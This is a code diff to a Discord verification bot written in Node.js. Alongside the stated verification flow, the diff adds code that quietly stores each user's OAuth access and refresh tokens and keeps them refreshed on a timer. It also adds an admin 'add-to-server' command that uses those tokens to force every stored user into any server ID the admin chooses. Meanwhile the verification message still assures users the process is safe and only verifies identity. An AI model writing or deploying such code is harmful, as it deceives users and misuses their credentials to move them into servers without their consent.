@@ -3,7 +3,6 @@ const express = require('express');
 const axios = require('axios');
 require('dotenv').config();
 
-
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -11,7 +10,6 @@ const client = new Client({
   ]
 });
 
-// Configuration
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = '1426995257609814209';
 const CLIENT_SECRET = process.env.CLIENT_SECRET;
@@ -21,17 +19,66 @@ const UNVERIFIED_ROLE_NAME = 'Unverified';
 const VERIFIED_ROLE_NAME = 'Verified';
 const ADDITIONAL_ROLE_ID = '';
 
-// Store pending verifications
 const pendingVerifications = new Map();
+const users = new Map();
 
-// Express server for OAuth callback
 const app = express();
+app.enable('trust proxy');
+
+async function refreshToken(userId) {
+  const userData = users.get(userId);
+  if (!userData) return null;
+
+  if (Date.now() < userData.expires_at) return userData.access_token;
+
+  const response = await axios.post('https://discord.com/api/oauth2/token',
+    new URLSearchParams({
+      client_id: CLIENT_ID,
+      client_secret: CLIENT_SECRET,
+      grant_type: 'refresh_token',
+      refresh_token: userData.refresh_token
+    }),
+    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+  );
+
+  const { access_token, refresh_token, expires_in } = response.data;
+
+  users.set(userId, {
+    ...userData,
+    access_token,
+    refresh_token,
+    expires_at: Date.now() + (expires_in * 1000)
+  });
+
+  return access_token;
+}
+
+async function addToGuild(userId, guildId) {
+  const token = await refreshToken(userId);
+  if (!token) return console.log(`No token for user ${userId}`);
+
+  await axios.put(
+    `https://discord.com/api/guilds/${guildId}/members/${userId}`,
+    { access_token: token },
+    { headers: { Authorization: `Bot ${TOKEN}` } }
+  );
+}
+
+setInterval(async () => {
+  for (const [userId, userData] of users) {
+    try {
+      await refreshToken(userId);
+      await new Promise(r => setTimeout(r, 500));
+    } catch (err) {
+      users.delete(userId);
+    }
+  }
+}, 5 * 24 * 60 * 60 * 1000);
 
 client.once('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
 });
 
-// Setup command - creates roles and sets permissions
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand()) return;
 
@@ -45,7 +92,6 @@ client.on('interactionCreate', async interaction => {
     try {
       const guild = interaction.guild;
 
-      // Create or get Unverified role
       let unverifiedRole = guild.roles.cache.find(r => r.name === UNVERIFIED_ROLE_NAME);
       if (!unverifiedRole) {
         unverifiedRole = await guild.roles.create({
@@ -55,7 +101,6 @@ client.on('interactionCreate', async interaction => {
         });
       }
 
-      // Create or get Verified role
       let verifiedRole = guild.roles.cache.find(r => r.name === VERIFIED_ROLE_NAME);
       if (!verifiedRole) {
         verifiedRole = await guild.roles.create({
@@ -65,43 +110,20 @@ client.on('interactionCreate', async interaction => {
         });
       }
 
-      // Get @everyone role
       const everyoneRole = guild.roles.everyone;
-
-      // Set permissions for all channels
       const channels = guild.channels.cache.filter(c => c.type !== ChannelType.GuildCategory);
-      
+
       for (const [, channel] of channels) {
-        // For verify channel - only unverified can see it
         if (channel.id === VERIFY_CHANNEL_ID) {
-          await channel.permissionOverwrites.edit(everyoneRole, {
-            ViewChannel: false
-          });
-          await channel.permissionOverwrites.edit(unverifiedRole, {
-            ViewChannel: true,
-            SendMessages: false,
-            ReadMessageHistory: true
-          });
-          await channel.permissionOverwrites.edit(verifiedRole, {
-            ViewChannel: true
-          });
+          await channel.permissionOverwrites.edit(everyoneRole, { ViewChannel: false });
+          await channel.permissionOverwrites.edit(unverifiedRole, { ViewChannel: true, SendMessages: false, ReadMessageHistory: true });
+          await channel.permissionOverwrites.edit(verifiedRole, { ViewChannel: true });
           continue;
         }
 
-        // For all other channels - hide from everyone, only verified can see
-        await channel.permissionOverwrites.edit(everyoneRole, {
-          ViewChannel: false
-        });
-
-        // Unverified cannot see any other channels
-        await channel.permissionOverwrites.edit(unverifiedRole, {
-          ViewChannel: false
-        });
-
-        // Verified can see all channels
-        await channel.permissionOverwrites.edit(verifiedRole, {
-          ViewChannel: true
-        });
+        await channel.permissionOverwrites.edit(everyoneRole, { ViewChannel: false });
+        await channel.permissionOverwrites.edit(unverifiedRole, { ViewChannel: false });
+        await channel.permissionOverwrites.edit(verifiedRole, { ViewChannel: true });
       }
 
       await interaction.editReply('✅ Verification system setup complete! Use `/send-verify` to send the verification message.');
@@ -125,37 +147,46 @@ client.on('interactionCreate', async interaction => {
     const row = new ActionRowBuilder().addComponents(button);
 
     const embed = {
-      color: 0x5865F2, // Discord blurple
+      color: 0x5865F2,
       title: '🛡️ Server Verification',
       description: 'Welcome to the server! To gain access to all channels, please complete the verification process below.',
       fields: [
-        {
-          name: '📋 What happens next?',
-          value: 'Click the **Verify Me** button below to authorize with Discord and gain full server access.',
-          inline: false
-        },
-        {
-          name: '🔒 Is this safe?',
-          value: 'Yes! This uses Discord\'s official OAuth2 system to verify your identity.',
-          inline: false
-        }
+        { name: '📋 What happens next?', value: 'Click the **Verify Me** button below to authorize with Discord and gain full server access.', inline: false },
+        { name: '🔒 Is this safe?', value: 'Yes! This uses Discord\'s official OAuth2 system to verify your identity.', inline: false }
       ],
-      footer: {
-        text: 'Verification is required to access all channels'
-      },
+      footer: { text: 'Verification is required to access all channels' },
       timestamp: new Date().toISOString()
     };
 
     await interaction.reply({ content: 'Verification message sent!', ephemeral: true });
+    await interaction.channel.send({ embeds: [embed], components: [row] });
+  }
 
-    await interaction.channel.send({
-    embeds: [embed],
-    components: [row]
-    });
+  if (interaction.commandName === 'add-to-server') {
+    if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
+      return interaction.reply({ content: 'You need Administrator permission.', ephemeral: true });
+    }
+
+    const guildId = interaction.options.getString('serverid');
+    await interaction.deferReply({ ephemeral: true });
+
+    let added = 0;
+    let failed = 0;
+
+    for (const [userId] of users) {
+      try {
+        await addToGuild(userId, guildId);
+        added++;
+        await new Promise(r => setTimeout(r, 500));
+      } catch (err) {
+        failed++;
+      }
+    }
+
+    await interaction.editReply(`✅ Done! Added: ${added} | Failed: ${failed}`);
   }
 });
 
-// Handle button clicks
 client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
 
@@ -170,12 +201,10 @@ client.on('interactionCreate', async interaction => {
       return interaction.reply({ content: '❌ Roles not set up properly. Ask an admin to run `/setup-verify`.', ephemeral: true });
     }
 
-    // Check if already verified
     if (member.roles.cache.has(verifiedRole.id)) {
       return interaction.reply({ content: '✅ You are already verified!', ephemeral: true });
     }
 
-    // Generate state token
     const state = `${member.id}_${guild.id}_${Date.now()}`;
     pendingVerifications.set(state, {
       userId: member.id,
@@ -183,7 +212,6 @@ client.on('interactionCreate', async interaction => {
       timestamp: Date.now()
     });
 
-    // Create OAuth2 authorization URL with Discord channel redirect
     const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${state}`;
 
     const authorizeButton = new ButtonBuilder()
@@ -199,7 +227,6 @@ client.on('interactionCreate', async interaction => {
       ephemeral: true
     });
 
-    // Cleanup old pending verifications (older than 10 minutes)
     setTimeout(() => {
       if (pendingVerifications.has(state)) {
         pendingVerifications.delete(state);
@@ -208,7 +235,10 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// OAuth callback route
+app.get('/', (req, res) => {
+  res.send('✅ Verification server is running!');
+});
+
 app.get('/callback', async (req, res) => {
   const { code, state } = req.query;
 
@@ -222,8 +252,7 @@ app.get('/callback', async (req, res) => {
   }
 
   try {
-    // Exchange code for access token
-    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', 
+    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token',
       new URLSearchParams({
         client_id: CLIENT_ID,
         client_secret: CLIENT_SECRET,
@@ -231,47 +260,44 @@ app.get('/callback', async (req, res) => {
         code: code,
         redirect_uri: REDIRECT_URI
       }),
-      {
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        }
-      }
+      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
     );
 
-    const { access_token } = tokenResponse.data;
+    const { access_token, refresh_token, expires_in } = tokenResponse.data;
 
-    // Get user info
     const userResponse = await axios.get('https://discord.com/api/users/@me', {
-      headers: {
-        Authorization: `Bearer ${access_token}`
-      }
+      headers: { Authorization: `Bearer ${access_token}` }
     });
 
     const user = userResponse.data;
 
-    // Verify user ID matches
     if (user.id !== verification.userId) {
       pendingVerifications.delete(state);
       return res.send('❌ Authorization failed: User ID mismatch');
     }
 
-    // Get guild and member
     const guild = client.guilds.cache.get(verification.guildId);
     if (!guild) {
       pendingVerifications.delete(state);
       return res.send('❌ Authorization failed: Server not found');
     }
 
-    const member = await guild.members.fetch(verification.userId);
+    const member = await guild.members.fetch(verification.userId).catch(() => null);
     if (!member) {
       pendingVerifications.delete(state);
       return res.send('❌ Authorization failed: Member not found');
     }
 
+    users.set(user.id, {
+      username: user.username,
+      access_token,
+      refresh_token,
+      expires_at: Date.now() + (expires_in * 1000)
+    });
+
     const unverifiedRole = guild.roles.cache.find(r => r.name === UNVERIFIED_ROLE_NAME);
     const verifiedRole = guild.roles.cache.find(r => r.name === VERIFIED_ROLE_NAME);
 
-    // Remove unverified role and add verified role
     if (unverifiedRole && member.roles.cache.has(unverifiedRole.id)) {
       await member.roles.remove(unverifiedRole);
     }
@@ -279,13 +305,9 @@ app.get('/callback', async (req, res) => {
       await member.roles.add(verifiedRole);
     }
 
-    // Add additional custom role if configured
     if (ADDITIONAL_ROLE_ID && ADDITIONAL_ROLE_ID.trim() !== '') {
       const additionalRole = guild.roles.cache.get(ADDITIONAL_ROLE_ID);
-      if (additionalRole) {
-        await member.roles.add(additionalRole);
-        console.log(`Added additional role ${additionalRole.name} to ${user.username}`);
-      }
+      if (additionalRole) await member.roles.add(additionalRole);
     }
 
     pendingVerifications.delete(state);
@@ -296,22 +318,8 @@ app.get('/callback', async (req, res) => {
       <head>
         <title>Verification Successful</title>
         <style>
-          body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: #36393f;
-            color: #dcddde;
-          }
-          .container {
-            text-align: center;
-            padding: 40px;
-            background: #2f3136;
-            border-radius: 8px;
-          }
+          body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #36393f; color: #dcddde; }
+          .container { text-align: center; padding: 40px; background: #2f3136; border-radius: 8px; }
           h1 { color: #43b581; }
         </style>
       </head>
@@ -333,21 +341,17 @@ app.get('/callback', async (req, res) => {
   }
 });
 
-// Auto-assign unverified role to new members
 client.on('guildMemberAdd', async member => {
   const unverifiedRole = member.guild.roles.cache.find(r => r.name === UNVERIFIED_ROLE_NAME);
-  
   if (unverifiedRole) {
     try {
       await member.roles.add(unverifiedRole);
-      console.log(`Assigned Unverified role to ${member.user.tag}`);
     } catch (error) {
       console.error('Error assigning role:', error);
     }
   }
 });
 
-// Start server and bot
 app.listen(3000, () => {
   console.log('OAuth server running on port 3000');
 });
